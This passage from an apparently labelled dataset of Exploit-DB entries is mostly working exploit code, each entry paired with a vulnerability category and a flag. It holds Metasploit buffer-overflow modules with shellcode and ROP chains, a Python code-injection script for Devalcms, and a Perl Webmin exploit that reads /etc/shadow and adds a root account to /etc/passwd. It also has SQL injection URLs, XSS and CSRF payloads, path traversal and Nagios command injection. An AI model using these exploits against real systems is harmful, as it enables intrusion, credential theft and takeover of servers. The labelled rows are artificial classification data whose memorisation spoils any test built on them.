'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ], 				], 			'Privileged'	=> true, 			'License'	=> MSF_LICENSE, 			'Payload'	=> 				{ 					'Space' => 512, 					'BadChars' => ""\x00\x2f\x3a\x40\x5c"", 					'StackAdjustment' => -3500, 				}, 			'Targets'	=> 				[ 					[ 'Brute Force', { } ], 					# '\Device\HarddiskVolume1\WINDOWS\system32\unicode.nls' 					[ 						'Firebird WI-V2.0.0.12748 WI-V2.0.1.12855 (unicode.nls)', 						{ 'Length' => [ 756 ], 'Ret' => 0x00370b0b } 					], 					# Debug 					[ 						'Debug', 						{ 'Length' => [ 756 ], 'Ret' => 0xaabbccdd } 					], 				], 			'DefaultTarget'	=> 1, 			'DisclosureDate'  => 'Oct 03 2007' 		))  		register_options( 			[ 				Opt::RPORT(3050) 			], self.class) 	end  	# Create database parameter block 	def dpb_create 		isc_dpb_user_name = 28 		isc_dpb_password = 29  		isc_dpb_version1 = 1  		user = 'SYSDBA' 		pass = 'masterkey'  		dpb = ''  		dpb << [isc_dpb_version1].pack('c')  		dpb << [isc_dpb_user_name].pack('c') 		dpb << [user.length].pack('c') 		dpb << user  		dpb << [isc_dpb_password].pack('c') 		dpb << [pass.length].pack('c') 		dpb << pass  		dpb 	end  	# Calculate buffer padding 	def buf_padding(length = '') 		remainder = length.remainder(4) 		padding = 0  		if remainder > 0 			padding = (4 - remainder) 		end  		padding 	end  	def exploit_target(target)  		target['Length'].each do |length|  			connect  			# Create database 			op_create = 20  			# Extra padding to trigger the exception 			extra_padding = 1024 * 16  			buf = ''  			# Operation/packet type 			buf << [op_create].pack('N')  			# Id 			buf << [0].pack('N')  			# Length 			buf << [length + extra_padding].pack('N')  			# Nop block 			buf << make_nops(length - payload.encoded.length - 13)  			# Payload 			buf << payload.encoded  			# Jump back into the nop block 			buf << ""\xe9"" + [-516].pack('V')  			# Jump back 			buf << ""\xeb"" + [-7].pack('c')  			# Random alpha data 			buf << rand_text_alpha(2)  			# Target 			buf << [target.ret].pack('V')  			# Random alpha data 			buf << rand_text_alpha(extra_padding)  			# Padding 			buf << ""\x00"" * buf_padding(length + extra_padding)  			# Database parameter block  			# Create database parameter block 			dpb = dpb_create  			# Database parameter block length 			buf << [dpb.length].pack('N')  			# Database parameter block 			buf << dpb  			# Padding 			buf << ""\x00"" * buf_padding(dpb.length)  			sock.put(buf)  			select(nil,nil,nil,4)  			handler  		end  	end  end",Remote Buffer Overflow,1
32708,"Plunet BusinessManager 4.1 - '/pagesUTF8/auftrag_allgemeinauftrag.jsp' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/33153/info  Plunet BusinessManager is prone to multiple security-bypass and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, control how the site is rendered to the user, or perform unauthorized actions as another user; other attacks may also be possible.  Versions prior to BusinessManager 4.2 are vulnerable.  POST /pagesUTF8/auftrag_allgemeinauftrag.jsp HTTP/1.1 Host: <HOSTNAME> or IP User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16)  Gecko/20080718 Ubuntu/8.04 (hardy) Firefox/2.0.0.16 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Proxy-Connection: keep-alive Referer: http://www.example.com/pagesUTF8/auftrag_allgemeinauftrag.jsp Cookie: JSESSIONID=0B1347DFFD031E6BC1944C381A31293D Content-Type: application/x-www-form-urlencoded Content-Length: 1085  TokenUAID=42&QUK=1449&QUKA=*&QUKANSCH=820&QUKLIEFANSCH=820&QUZ=sample& VorlageID=3&QU02=1-&QUL=sample&QUB=%22%3E%3Cscript%3Ealert%28%22XSS2%22%29 %3B%3C%2Fscript%3E&QUG=sample&OSPK01=141&OSPK02=0&OSSK05=&OSSK09=1&PJ12=14 &DATAUFTT=07&DATAUFMM=01&DATAUFJJJJ=2008&DATLIEFTT=24&DATLIEFMM=01& DATLIEFJJJJ=2008&DATLIEFHH=&DATLIEFMN=&PJ13=& Bez74=%22%3E%3Cscript%3Ealert%28%22XSS4%22%29%3B%3C%2Fscript%3E& LDate74TT=24&LDate74MM=01&LDate74JJJJ=2008&LDate74HH=13& LDate74MN=00&BOXP74=4&REA01774=59&REA01874=sample& OutPE0174=0&OutPAP74=8385&Bem74=sample&REA001=&REA010=&REA007=1&REA008=2& REA011=0&REA013=0&REA015=0&LEISTung=sample&LangFlag=&exit=&SelectTab= &ContentBox=&OpenContentBox=&LoginPressed=false&SaveButton=true& CheckXYZ=Send&yOffsetScroll=0",Cross-Site Scripting Vulnerabilities,1
15719,"Joomla! Component JE Messenger 1.0 - Arbitrary File Upload JE Messenger 1.0 Arbitrary File Upload Vulnerability   Name              JE Messenger  Vendor            http://joomlaextensions.co.in  Versions Affected 1.0   Author            Salvatore Fresta aka Drosophila  Website           http://www.salvatorefresta.net  Contact           salvatorefresta [at] gmail [dot] com  Date              2010-12-09  X. INDEX   I.    ABOUT THE APPLICATION  II.   DESCRIPTION  III.  ANALYSIS  IV.   SAMPLE CODE  V.    FIX    I. ABOUT THE APPLICATION ________________________  JE Messenger is a Joomla's component.   II. DESCRIPTION _______________  A parameter is not properly sanitised before  being used from the native Joomla's upload function.   III. ANALYSIS _____________  Summary:   A) Arbitrary File Upload    A) Arbitrary File Upload ________________________  A logic error in the save function  (compose.php)  allows to a registered user to upload a file with any extension. The check for a valid file's extension is made  after the upload and in the failure case, the file doesn't  removed from the server. This   can   be   exploited  to  execute  arbitrary PHP code by uploading a PHP file.  The file's name is different after the upload:  $file['name'] = time().'in'.$file['name'];  Example:  Original file's name: shell.php Uploaded file's name: 1291907399inshell.php  Where  1291907399  is  the  value returns from the time() function.  The file will be uploaded to the following directory:  $dest = JPATH_ROOT.DS.'components/'.$option.'/assets/images/'.$file['name'];  The default destination is:  http://site/path/components/com_jemessenger/assets/images/   IV. SAMPLE CODE _______________  A) Arbitrary File Upload  1 - Login to target website's Joomla 2 - Go to http://site/path/index.php?option=com_jemessenger&view=compose 3 - Compile a valid form and select an arbitrary file 4 - Go to http://site/path/components/com_jemessenger/assets/images/filename   Try a little bruteforce to find the value  returned  from the time() function.   V. FIX ______  No fix.",Arbitrary File Upload,1
21424,"ADManager 1.1 - Content Manipulation source: https://www.securityfocus.com/bid/4615/info  Admanager is banner advertisement management software. It is written in PHP and will run on most Unix and Linux variants, in addition to Microsoft Windows operating systems.  Access to the 'add.php3' script does not require authentication. It is possible for a remote attacker to manipulate URL parameters of this script and change banner advertisement content.  http://target/add.php3?url=http://www.url.com&adurl=http://URL/img.gif URL/",Content Manipulation,1
4948,Microsoft Windows RSH daemon 1.8 - Remote Buffer Overflow Windows RSH daemon <= 1.8 Remote Buffer Overflow Exploit  Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/4948.tar.gz (2008-prdelka-vs-MS-rshd.tar.gz)  # milw0rm.com [2008-01-21],Remote Buffer Overflow,1
4104,"6ALBlog - 'newsid' SQL Injection +______________________________________________By Crackers_Child___________________________________________+  * * *    [~] Portal.......:        6ALBlog All Versions *    [~] Download.....:    http://down.otand.com/download/code/php/blog/6alblog.rar *    [~] Author.......:       Crackers_Child  | cybermilitan@hotmail.com & localexploit@hotmail.com *    [~] Class........:       Remote SQL Injection and Remote File Ä°nclude Vulnerability *    [~] Dork.........:        inurl:""member.php?page=comments +_______________________________________________________________________________________________________________________+   +_______________________________________________________________________________________________________________________+ * * *       [~] Exploit Sql...:                    http://[Taget]/[Path]/member.php?page=comments&member=MEMBERNAME&newsid=-1%20union%20select%200,1,user,3,4,5,6,7%20from%20blog_users/* *                               http://[Taget]/[Path]/member.php?page=comments&member=MEMBERNAME&newsid=-1%20union%20select%200,1,pass,3,4,5,6,7%20from%20blog_users/* * * *       [~] Exploit Rfi...:     After Cracked md5 admin you must login site.com/admin/  than our rfi can  work * *                               http://[Taget]/[Path]/admin/index.php?pg=Sh3ll? +_______________________________________________________________________________________________________________________+            [~] Ä°nfo......:Brothas You must change MemberName on exploit , when you look index.php you will see members and you can choose anyone                        and you can write it on exploit ""MEMBERNAME"" area ;)    +_______________________________________________________________________________________________________________________+  +_______________________________________________________________________________________________________________________+ * * *       [~] Sp Tnx.......:    str0ke, BiyoSecurity.Net, TurkProtest, Tryag.com/cc/(Mahmood_ali),Dj7xpl,Dosyacek.com And All Friends * +_______________________________________________________________________________________________________________________+  # milw0rm.com [2007-06-25]",Remote SQL Injection,1
46111,"doitX 1.0 - 'search' SQL Injection # Exploit Title: doitX 1.0 - SQL Injection # Dork: N/A # Date: 2019-01-10 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://mybizcms.com/ # Software Link: https://codecanyon.net/item/doitx/23041037 # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1)  # http://localhost/[PATH]/searchs?search=[SQL]&search_from=entries #   POST /[PATH]/searchs?search=%45%66%65%27%20%2f%2a%21%31%31%31%31%31%55%4e%49%4f%4e%2a%2f%20%2f%2a%21%31%31%31%31%31%53%45%4c%45%43%54%2a%2f%20%31,%76%65%72%73%69%6f%6e%28%29,%33%2c%34%2c%35,%36%2c%37%2c%38%2c%39%2c%31%30,%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35,%31%36%2c%31%37%2d%2d%20%2d&search_from=entries HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate, br Cookie: PHPSESSID=0d8ccf7db10abc97c8d3c41fa705cbbc DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Date: Wed, 09 Jan 2019 19:19:05 GMT Server: Apache X-Powered-By: PHP/7.2.13 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked",SQL Injection,1
6369,"Devalcms 1.4a - Cross-Site Scripting / Remote Code Execution #!/usr/bin/python ##################################################################################### ####           devalcms v1.4a Remote Code Execution Exploit / Xss                #### ##################################################################################### #                                                                                   # #AUTHOR : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                                      # #Discovered by : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                               # #Our Site : Http://IRCRASH.COM                                                      # #IRCRASH Team Members : Dr.Crash - R3d.w0rm (Sina Yazdanmehr)                       # ##################################################################################### #                                                                                   # #Download : http://www.sourceforge.net/projects/devalcms                            # #                                                                                   # #DORK : ""powered by devalcms v1.4.a""                                                # #                                                                                   # ##################################################################################### #                                      [Xss]                                        # #                                                                                   # #http://Site/[path]/index.php?currentpath=<script>alert('Xss')</script>             # #                                                                                   # ##################################################################################### #                                                                                   # #                           [Remote Code Execution]                                 # #                                                                                   # #Use this exploit for remote code execution valun .                                 # #                                                                                   # ##################################################################################### #                           Site : Http://IRCRASH.COM                               # ###################################### TNX GOD ###################################### import sys,socket argv=sys.argv data='<?php include $_GET[\'evil\']; ?>' query='/modules/tool/hitcounter.php?gv_folder_data=./url2header.php%00' if len(argv) < 3 :     print '[*]Devalcms v1.4.a Remote code execut exploit'     print '[*]Dork : powered by devalcms v1.4.a'     print '[*]Powered by : R3d.W0rm'     print '[*]Our Site : http://ircrash.com'     print '[*]Usage : ' + argv[0] + ' site /path'     exit() if 'http://' in argv[1] :     target=argv[1].replace('http://','') else :     target=argv[1] if '/' in argv[2] :     path=argv[2] else :     path='/' + argv[2] print '[*]Devalcms v1.4.a Remote code execut exploit' print '[*]Powered by : R3d.W0rm' print '[*]Our Site : http://ircrash.com' sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((target,80)) sock.send(""GET "" + path + query + "" HTTP/1.1\n"") sock.send(""Host: "" + target + ""\n"") sock.send(""Referer: "" + data + ""\n\n\n"") recv=sock.recv(2048) if 'HTTP/1.1 200 OK' in recv :     print '[+]Code injected .'     print '[+]Code inject in http://: ' + target + path + '/modules/tool/url2header.php' else :     print '[-]Can not inject code.' exit()  # milw0rm.com [2008-09-05]",Remote Code Execution,1
46850,"Legrand BTicino Driver Manager F454 1.0.51 - Cross-Site Request Forgery / Cross-Site Scripting <!--  Legrand BTicino Driver Manager F454 1.0.51 CSRF Change Password Exploit   Vendor: BTicino S.p.A. Product web page: https://www.bticino.com  Affected version: Hardware Platform: F454                   Firmware version: 1.0.51                   Driver Manager version: 1.1.14  Summary: Audio/video web server for the remote control of the system using web pages or the MY HOME portal. The device can operate as a gateway for the use of the MHVisual and Virtual Configurator software - 6 DIN modules. It replaces item F453 and F453AV.  Desc: The application interface allows users to perform certain actions via HTTP requests without performing any validity checks to verify the requests. This can be exploited to perform certain actions with administrative privileges if a logged-in user visits a malicious web site.  Tested on: Apache/2.2.14 (Unix)            OpenSSL/1.0.0d            PHP/5.1.6   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                                   @zeroscience   Advisory ID: ZSL-2019-5521 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5521.php  30.04.2019  -->   <!-- CSRF PoC web access password change --> <html>   <body>     <form action=""http://192.168.1.66:8080/system/password.save.php"" method=""POST"">       <input type=""hidden"" name=""password1"" value=""newpass123"" />       <input type=""hidden"" name=""password2"" value=""newpass123"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>   <!-- CSRF PoC OpenWebNet password change --> <html>   <body>     <form action=""http://192.168.1.66:8080/system/ownpassword.save.php"" method=""POST"">       <input type=""hidden"" name=""ownpassword"" value=""ilegnisi"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>   <!--  Legrand BTicino Driver Manager F454 1.0.51 Authenticated Stored XSS Exploit   Vendor: BTicino S.p.A. Product web page: https://www.bticino.com  Affected version: Hardware Platform: F454                   Firmware version: 1.0.51                   Driver Manager version: 1.1.14  Summary: Audio/video web server for the remote control of the system using web pages or the MY HOME portal. The device can operate as a gateway for the use of the MHVisual and Virtual Configurator software - 6 DIN modules. It replaces item F453 and F453AV.  Desc: The application suffers from an authenticated stored XSS via GET request. The issue is triggered when input passed via the GET parameter 'server' is not properly sanitized before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: Apache/2.2.14 (Unix)            OpenSSL/1.0.0d            PHP/5.1.6   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                                   @zeroscience   Advisory ID: ZSL-2019-5522 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5522.php  30.04.2019  -->   <!-- Stored XSS via GET request --> <html>   <body>     <form action=""http://192.168.1.66:8080/system/time.ntp.php"">       <input type=""hidden"" name=""mode"" value=""mine"" />       <input type=""hidden"" name=""server"" value='""><marquee>Waddup.</marquee>' />       <input type=""submit"" value=""Signal"" />     </form>   </body> </html>  <!-- GET http://192.168.1.66:8080/system/time.ntp.php?mode=mine&server=""><marquee>Waddup.</marquee> HTTP/1.1 -->",CSRF Change Password Exploit,1
34977,WordPress Plugin jRSS Widget 1.1.1 - 'url' Information Disclosure source: https://www.securityfocus.com/bid/44716/info  The jRSS Widget Plugin for WordPress is prone to an information-disclosure vulnerability because it fails to sufficiently validate user-supplied data.  An attacker can exploit this issue to view local files in the context of the affected application. This may allow the attacker to obtain sensitive information; other attacks are also possible.  jRSS Widget 1.1.1 is vulnerable; other versions may also be affected.  http://www.example.com/wordpress/wp-content/plugins/jrss-widget/proxy.php?url=../../../../../../../../windows/win.ini,Information Disclosure,1
25038,"Kayako eSupport 2.x - Ticket System Multiple SQL Injections source: https://www.securityfocus.com/bid/12037/info   Kayako eSupport is prone to multiple input validation vulnerabilities. One cross-site scripting and six SQL injection vulnerabilities.   These issues may collectively threaten compromise of software and database security properties. Possible attacks include theft of cookie-based authentication credentials, exposure or modification of database information, and a potential for attacks against the underlying database implementation.   http://www.example.com/index.php?_a=knowledgebase&_j=subcat&_i=[SQL]  http://www.example.com/index.php?_a=knowledgebase&_j=rate&_i=[SQL]&type=no  http://www.example.com/index.php?_a=knowledgebase&_j=questiondetails&_i=[SQL]  http://www.example.com/index.php?_a=tickets&_m=viewmain&email22=blah@blah&ticketkey22=[ SQL]  http://www.example.com/index.php?_a=tickets&_m=viewmain&email22=[SQL]&ticketkey22=",cross-site scripting,1
26560,"PmWiki 2.0.x - Search Cross-Site Scripting source: https://www.securityfocus.com/bid/15539/info   PmWiki is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  PmWiki 2.0 up to and including 2.0.12 are vulnerable; other versions may also be affected.   http://www.example.com/Site/Search?action=search&q=TRY%20ANOTHER%20SEARCH%20NOW!%20YES,%20YOU!'%20onMouseOver='alert(document.title);'%20",Search Cross-Site Scripting,1
25895,"CarLine Forum Russian Board 4.2 - 'enter.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/14045/info                    Forum Russian Board is prone to multiple input validation vulnerabilities. These issues can allow attackers to carry out SQL Injection, cross-site scripting, and HTML injection attacks.                    Forum Russian Board 4.2 is reported to be affected.   enter.php?sid=' enter.php?sid=1&passw='",input validation,0
21765,"Webmin 0.x - 'RPC' Privilege Escalation source: https://www.securityfocus.com/bid/5591/info  In cases where users of Webmin do not have root access on the underlying host, it may be possible to mount privilege escalation attacks on the underlying host. This normally occurs in configurations where multiple Webmin client systems have access to a centralized Webmin server.  Webmin allows commands to be executed remotely on the underlying host from other Webmin client systems via the RPC module. However, the script that provides this facility does not sufficiently check the permissions of the source of the remote commands. As a result, it is possible for remote authenticated Webmin users to abuse this facility to execute commands (as root) on the underlying host.  This may be exploited to gain root access to a system hosting the vulnerable software.   #!/usr/bin/perl # urlize # Convert a string to a form ok for putting in a URL sub urlize {   local $rv = $_[0];   $rv =~ s/([^A-Za-z0-9])/sprintf(""%%%2.2X"", ord($1))/ge;   return $rv;  }  # un_urlize(string) # Converts a URL-encoded string to the original sub un_urlize { local $rv = $_[0]; $rv =~ s/\+/ /g; $rv =~ s/%(..)/pack(""c"",hex($1))/ge; return $rv; }  # serialise_variable(variable) # Converts some variable (maybe a scalar, hash ref, array ref or scalar ref) # into a url-encoded string sub serialise_variable { if (!defined($_[0])) {         return 'UNDEF';         } local $r = ref($_[0]); local $rv; if (!$r) {         $rv = &urlize($_[0]);         } elsif ($r eq 'SCALAR') {         $rv = &urlize(${$_[0]});         } elsif ($r eq 'ARRAY') {         $rv = join("","", map { &urlize(&serialise_variable($_)) } @{$_[0]});         } elsif ($r eq 'HASH') {         $rv = join("","", map { &urlize(&serialise_variable($_))."","".                               &urlize(&serialise_variable($_[0]->{$_})) }                             keys %{$_[0]});         } elsif ($r eq 'REF') {         $rv = &serialise_variable(${$_[0]});         } return ($r ? $r : 'VAL')."","".$rv; }  # unserialise_variable(string) # Converts a string created by serialise_variable() back into the original # scalar, hash ref, array ref or scalar ref. sub unserialise_variable { local @v = split(/,/, $_[0]); local ($rv, $i); if ($v[0] eq 'VAL') {         $rv = &un_urlize($v[1]);         } elsif ($v[0] eq 'SCALAR') {         local $r = &un_urlize($v[1]);         $rv = \$r;         } elsif ($v[0] eq 'ARRAY') {         $rv = [ ];         for($i=1; $i<@v; $i++) {                 push(@$rv, &unserialise_variable(&un_urlize($v[$i])));                 }         } elsif ($v[0] eq 'HASH') {         $rv = { };         for($i=1; $i<@v; $i+=2) {                 $rv->{&unserialise_variable(&un_urlize($v[$i]))} =                         &unserialise_variable(&un_urlize($v[$i+1]));                 }         } elsif ($v[0] eq 'REF') {         local $r = &unserialise_variable($v[1]);         $rv = \$r;         } elsif ($v[0] eq 'UNDEF') {         $rv = undef;         } return $rv; }  # encode_base64(string) # Encodes a string into base64 format sub encode_base64 {     local $res;     pos($_[0]) = 0; # ensure start at the beginning     while ($_[0] =~ /(.{1,45})/gs) {         $res .= substr(pack('u', $1), 1).""\n"";         chop($res);     }     $res =~ tr|\` -_|AA-Za-z0-9+/|;     local $padding = (3 - length($_[0]) % 3) % 3;     $res =~ s/.{$padding}$/'=' x $padding/e if ($padding);     return $res; }  use Socket; if ($#ARGV<6) {die ""Usage: exploit.pl proxyIP proxyPort remoteIP remotePort username password command_interface command interface should equal one of these: 1 - read file /etc/passwd 2 - read file /etc/shadow 3 - insert into file /etc/passwd (\""hacked:x:0:0:root:/root:/bin/bash\"") 4 - insert into file /etc/shadow (\""hacked::0:99999:7:-1:-1:134538548\"") "";}  $username = $ARGV[4]; $password = $ARGV[5];  $proxyPort = $ARGV[1]; $proxyIP = $ARGV[0];  $remoteIP = $ARGV[2]; $remotePort = $ARGV[3]; $command_interface = $ARGV[6];  $target = inet_aton($proxyIP); $paddr = sockaddr_in($proxyPort, $target);  print ""Connecting to: $proxyIP:$proxyPort, with the following user: $username and password: $password. Hacking server:  $remoteIP:$remotePort\n"";  $auth = &encode_base64(""$username:$password""); $auth =~ s/\n//g;  if (($command_interface eq 1) || ($command_interface eq 3)) {  $d = { 'action' => 'read', 'file' => ""/etc/passwd"", 'session' => ""0""}; } if (($command_interface eq 2) || ($command_interface eq 4)) {  $d = { 'action' => 'read', 'file' => ""/etc/shadow"", 'session' => ""0""}; }  $tostr = &serialise_variable($d); $lengthstr = length($tostr);  $request = ""POST /rpc.cgi HTTP/1.1 Host: $remoteIP:$remotePort User-agent: Webmin Authorization: basic $auth Content-Length: $lengthstr  $tostr"";  print ""Sending:\n---\n$request\n---\n"";  $proto = getprotobyname('tcp'); socket(S, PF_INET, SOCK_STREAM, $proto) || die(""Socket problems\n"");  connect(S, $paddr) || die ""connect: $!"";  select(S); $|=1; # print $pstr; print $request;  $found = 0; while(<S>) {  if (($found == 1) || (/^\r\n/))  {   if ($found == 0)   {    $found = 1;   }   else   {    $in = join ("""", $in, $_);   }  } } select(STDOUT);  print ""Raw:\n---\n$in\n---\n"";  print ""Unserialized:\n---\n"", unserialise_variable($in)->{'rv'}, ""\n---\n"";  close(S);  if ($command_interface eq 3) {  $d = { 'action' => 'write', 'data'=>join("""", unserialise_variable($in)->{'rv'}, ""hacked:x:0:0:root:/root:/bin/bash\n""), 'file' =>  ""/etc/passwd"", 'session' => ""0""}; } if ($command_interface eq 4) {  $d = { 'action' => 'write', 'data'=>join("""", unserialise_variable($in)->{'rv'}, ""hacked::0:99999:7:-1:-1:134538548\n""), 'file' =>  ""/etc/shadow"", 'session' => ""0""}; }  $tostr = &serialise_variable($d); $lengthstr = length($tostr);  $request = ""POST /rpc.cgi HTTP/1.1 Host: $remoteIP:$remotePort User-agent: Webmin Authorization: basic $auth Content-Length: $lengthstr  $tostr"";  print ""Sending:\n---\n$request\n---\n"";  $proto = getprotobyname('tcp'); socket(S, PF_INET, SOCK_STREAM, $proto) || die(""Socket problems\n"");  connect(S, $paddr) || die ""connect: $!"";  select(S); $|=1; # print $pstr; print $request;  $found = 0; while(<S>) {  if (($found == 1) || (/^\r\n/))  {   if ($found == 0)   {    $found = 1;   }   else   {    $in = join ("""", $in, $_);   }  } }  select(STDOUT);  print ""Raw:\n---\n$in\n---\n"";  print ""Unserialized:\n---\n"", unserialise_variable($in)->{'rv'}, ""\n---\n"";  close(S);  # --- EOF ---",Privilege Escalation,1
18478,"Citrix Provisioning Services 5.6 SP1 - Streamprocess Opcode 0x40020000 Buffer Overflow (Metasploit) ## # $Id: $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Udp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Citrix Provisioning Services 5.6 SP1 Streamprocess Opcode 0x40020000 Buffer Overflow', 			'Description'    => %q{ 				This module exploits a remote buffer overflow in the Citrix Provisioning Services 				5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet to the 				6905/UDP port.  The module has been successfully tested on Windows Server 2003 SP2, 				Windows 7, and Windows XP SP3. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'AbdulAziz Hariri',             # Initial discovery via ZDI 					'alino <26alino[at]gmail.com>'  # Metasploit module 				], 			'Version'        => '$Revision: $', 			'References'     => 				[ 					['BID', '49803'], 					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-009'], 					['URL', 'http://support.citrix.com/article/CTX130846'] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 					'InitialAutoRunScript' => 'migrate -f', 				}, 			'Payload'        => 				{ 					'BadChars' => ""\x00"", 					'EncoderOptions' => {'BufferRegister'=>'ECX'}, 				}, 			'Platform'       => ['win'], 			'Targets'        => 				[ 					[ 'Citrix Provisioning Services 5.6 SP1', 						{ 							'Offset' => 2012, 							'Ret'    => 0x0045403a # ADD ESP,664; RETN 04 streamprocess.exe 						} 					] 				], 			'Privileged'     => true, 			'DisclosureDate' => 'Nov 04 2011',  #CTX130846 creation date 			'DefaultTarget'  => 0))  		register_options([Opt::RPORT(6905)], self.class) 	end  	def exploit  		packet =  ""\x00\x00\x02\x40"" # DATA MSG 		packet << rand_text_alpha_upper(18) 		packet << ""\x00\x00\x00\x00"" # Length 		packet << rand_text_alpha_upper(target['Offset']) 		packet << [target.ret].pack('V')  		rop_nop = [0x004a072c].pack('V') * 38 # RETN streamprocess.exe  		rop_gadgets = 		[ 			0x0045b141, # POP EAX; RETN streamprocess.exe 			0x1009a1bc, # VirtualProtect() 			0x00436d44, # MOV EAX,DWORD PTR DS:[EAX]; RETN streamprocess.exe 			0x004b0bbe, # XCHG EAX,ESI; RETN streamprocess.exe 			0x004ad0cf, # POP EBP; RETN streamprocess.exe 			0x00455d9d, # PUSH ESP; RETN streamprocess.exe 			0x00497f5a, # POP EAX; RETN streamprocess.exe 			0xfffff9d0, # dwSize 			0x00447669, # NEG EAX; RETN streamprocess.exe 			0x004138a7, # ADD EBX,EAX; XOR EAX,EAX; RETN streamprocess.exe 			0x00426305, # POP ECX; RETN streamprocess.exe 			0x00671fb9, # lpflOldProtect 			0x004e41e6, # POP EDI; RETN streamprocess.exe 			0x0040f004, # RETN streamprocess.exe 			0x00495c05, # POP EAX; RETN streamprocess.exe 			0xffffffc0, # flNewProtect 			0x0042c79a, # NEG EAX; RETN streamprocess.exe 			0x0049b676, # XCHG EAX,EDX; RETN streamprocess.exe 			0x0045c1fa, # POP EAX; RETN streamprocess.exe 			0x90909090, # NOP 			0x00435bbe, # PUSHAD; RETN streamprocess.exe 		].pack(""V*"")  		packet[258, rop_nop.length] = rop_nop 		packet[410, rop_gadgets.length] = rop_gadgets 		packet[494, 10] = ""\xeb\x03\x59\xff\xd1\xe8\xf8\xff\xff\xff"" 		packet[504, payload.encoded.length] = payload.encoded  		print_status(""Trying target #{target.name}..."")  		connect_udp 		udp_sock.put(packet)  		handler 		disconnect_udp 	end end",remote buffer overflow,1
23227,"Nagios XI Network Monitor Graph Explorer Component - Command Injection (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""Nagios XI Network Monitor Graph Explorer Component Command Injection"", 			'Description'    => %q{ 					This module exploits a vulnerability found in Nagios XI Network Monitor's 				component 'Graph Explorer'.  An authenticated user can execute system commands 				by injecting it in several parameters, such as in visApi.php's 'host' parameter, 				which results in remote code execution. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Daniel Compton <daniel.compton[at]ngssecure.com>', #Original discovery 					'sinn3r' 				], 			'References'     => 				[ 					[ 'OSVDB', '83552' ], 					[ 'BID', '54263' ], 					[ 'URL', 'http://packetstormsecurity.org/files/118497/Nagios-XI-Network-Monitor-2011R1.9-OS-Command-Injection.html' ] 				], 			'Payload'        => 				{ 					'BadChars' => ""\x00\x0d\x0a"", 					'Compat'      => 						{ 							'PayloadType' => 'cmd', 							'RequiredCmd' => 'generic perl python ruby bash telnet', 						} 				}, 			'Platform'       => ['unix'], 			'Arch'           => ARCH_CMD, 			'Targets'        => 				[ 					['Graph Explorer Component prior to 1.3', {}] 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Nov 30 2012"", 			'DefaultTarget'  => 0))  		register_options( 			[ 				# URI isn't registered, because this is set by the installer. 				OptString.new('USERNAME', [true, 'The username to login as', 'nagiosadmin']), 				OptString.new('PASSWORD', [true, 'The password to use']) 			], self.class) 	end   	def check 		res = send_request_raw({ 			'method' => 'GET', 			'uri'    => '/nagiosxi/includes/components/graphexplorer/visApi.php' 		})  		if res and res.code == 404 			print_error(""Remote host does not have Graph Explorer installed."") 		elsif res and res.body =~ /Your session has timed out/ 			return Exploit::CheckCode::Detected 		end  		return Exploit::CheckCode::Safe 	end  	def get_login_data 		res = send_request_cgi({'uri'=>'/nagiosxi/login.php'}) 		return '' if !res  		nsp = res.body.scan(/<input type='hidden' name='nsp' 